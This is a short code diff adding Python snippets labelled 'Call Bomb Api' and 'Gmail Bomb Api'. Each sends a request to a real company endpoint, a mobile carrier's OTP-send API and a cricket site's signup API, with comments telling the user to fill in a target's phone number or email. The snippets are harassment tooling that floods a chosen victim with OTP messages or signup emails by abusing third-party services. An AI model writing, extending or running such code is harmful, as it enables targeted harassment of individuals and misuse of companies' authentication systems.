@@ -1,0 +1,13 @@
+#-------[ Call Bomb Api ]--------#
+
+headers = {'Host': 'da-api.robi.com.bd','User-Agent': 'python-requests/2.31.0','Accept': 'application/json','Connection': 'keep-alive','Content-Type': 'application/json'}
+json_data = {'msisdn': '01817***933'} # akhane terget number set korben 
+response = requests.post('https://da-api.robi.com.bd/da-nll/otp/send', headers=headers, json=json_data)
+
+#-------[ Gmail Bomb Api ]--------#
+
+headers = {'Host': 'm.cricbuzz.com','User-Agent': 'python-requests/2.31.0','Accept': 'application/json','Connection': 'keep-alive','Content-Type': 'application/json'}
+json_data = {'username': 'exmple@gmail.com'} # Terget Gmail ba other mail set korben
+response = requests.post('https://m.cricbuzz.com/cbplus/auth/user/signup', headers=headers, json=json_data)
+
+#-------[ Enjoy]-------#
